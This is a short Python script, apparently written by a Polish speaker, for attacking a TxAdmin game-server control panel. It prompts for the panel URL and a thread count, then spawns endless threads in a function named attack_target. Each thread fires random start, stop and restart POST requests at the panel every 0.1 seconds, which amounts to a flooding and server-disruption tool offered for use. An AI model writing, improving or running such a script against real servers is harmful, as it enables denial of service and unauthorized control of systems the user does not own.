import requests
import random
import threading
import time

class TxAdminClient:
    def __init__(self, base_url):
        self.base_url = base_url
        self.commands = [
            "start",
            "stop",
            "restart",
            "status",
            "refresh"
        ]

    def send_random_command(self):
        command = random.choice(self.commands)
        url = f"{self.base_url}/{command}"
        try:
            response = requests.post(url)
            if response.status_code == 200:
                return response.json(), command
            else:
                return {"error": "Failed to execute command", "status_code": response.status_code}, command
        except requests.exceptions.RequestException as e:
            return {"error": str(e)}, command

def attack_target(client):
    while True:
        response, command = client.send_random_command()
        print(f"Command: {command}")
        print("Response:", response)
        time.sleep(0.1)  # Krótka przerwa między żądaniami, można dostosować lub usunąć

if __name__ == "__main__":
    base_url = input("Podaj adres URL panelu TxAdmin: ")  # Pytanie o adres URL panelu TxAdmina
    num_threads = int(input("Podaj liczbę wątków: "))  # Pytanie o liczbę wątków

    client = TxAdminClient(base_url)

    threads = []

    for i in range(num_threads):
        thread = threading.Thread(target=attack_target, args=(client,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

